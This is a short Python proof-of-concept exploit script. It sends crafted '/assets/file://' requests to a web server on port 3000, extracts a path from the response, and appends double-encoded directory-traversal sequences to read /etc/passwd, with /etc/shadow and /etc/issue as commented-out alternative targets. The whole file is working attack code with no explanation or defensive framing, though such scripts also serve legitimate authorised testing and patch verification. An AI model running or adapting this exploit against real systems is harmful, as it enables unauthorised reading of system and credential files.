# coding=utf-8
"""
DATE:   2021/7/1
AUTHOR: TesterCC
"""

import re
import requests

ip = "10.0.4.150"
port = "3000"
file_path = "/etc/passwd"


# file_path = "/etc/issue"
# file_path = "/etc/shadow"

def exp_run():
    target_url = 'http://{}:{}//assets/file:%2f%2f{}'.format(ip, port, file_path)
    res = requests.get(target_url).text
    res = re.findall('<h2>(.*?)</h2>', res)

    result = str(res).split(',')[1]

    handle_url = 'http://{}:{}//assets/file:%2f%2f'.format(ip,port) + result + '/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/' + file_path
    exp = handle_url.replace(' ', '')
    exp = requests.get(exp).text
    print(exp)


if __name__ == '__main__':
    exp_run()
